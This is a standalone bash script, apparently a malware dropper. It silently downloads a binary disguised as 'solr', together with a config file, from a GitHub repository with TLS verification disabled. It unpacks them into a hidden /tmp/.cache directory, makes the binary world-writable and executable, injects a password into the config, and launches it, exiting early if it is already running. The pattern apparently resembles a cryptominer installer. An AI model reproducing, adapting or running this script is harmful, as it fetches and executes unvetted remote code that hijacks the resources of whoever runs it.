#!/bin/bash
if pgrep -x "solr" > /dev/null; then
    exit 0
fi

p="/tmp"
config_file="config.json"
apachee_url="https://github.com/safe0909/check/raw/refs/heads/main/apache.tar.gz"
solr_url="https://github.com/safe0909/check/raw/refs/heads/main/solr"
config_url="https://raw.githubusercontent.com/safe0909/check/refs/heads/main/config.json"

random_number=$(shuf -i 10000000-99999999 -n 1)
ho="11pos11"
if [ ${#ho} -lt 1 ]; then
    ho=$random_number
fi

ROOT_path="$p/.cache"

if [ -d "$ROOT_path" ]; then
    rm -rf "$ROOT_path"
fi
mkdir -p "$ROOT_path"

cd "$ROOT_path" || handle_error "Unable to switch to directory: $ROOT_path !!!"

if which curl >/dev/null 2>&1; then
    download_command="curl -sSfk"
    download_tar="curl -sSfLk -o apachee.tar.gz"
    download_solr="curl -sSfLk -o solr"
    download_config="curl -sSfLk -o config.json"
elif which wget >/dev/null 2>&1; then
    download_command="wget --no-check-certificate -q -O-"
    download_tar="wget --no-check-certificate -O apachee.tar.gz"
    download_solr="wget --no-check-certificate -O solr"
    download_config="wget --no-check-certificate -O config.json"
else
    exit 1
fi

if which tar >/dev/null 2>&1; then
    $download_tar "$apachee_url"
    if [ -f "apachee.tar.gz" ]; then
        tar -xzf "apachee.tar.gz" -C "$ROOT_path"
        chmod 777 "$ROOT_path/solr"
        rm -rf apachee.tar.gz
    else
        $download_solr "$solr_url"
        $download_config "$config_url"
        if [ -f "solr" ]; then
            chmod 777 "$ROOT_path/solr"
        else
            exit 1
        fi
    fi
else
    $download_solr "$solr_url"
    $download_config "$config_url"
    if [ -f "solr" ]; then
        chmod 777 "$ROOT_path/solr"
    else
        exit 1
    fi
fi

if [ -f "$config_file" ]; then
    sed -i "s/\"pass\": \"random\"/\"pass\": \"$ho\"/g" "$config_file"
else
    echo "Config file $config_file not found"
fi

com="./solr"
start_sh="$ROOT_path/start.sh"
if [ -f "$start_sh" ]; then
    echo $com > start.sh
    chmod +x start.sh
    ./start.sh
else
    echo $com > start.sh
    chmod +x start.sh
    ./start.sh
fi
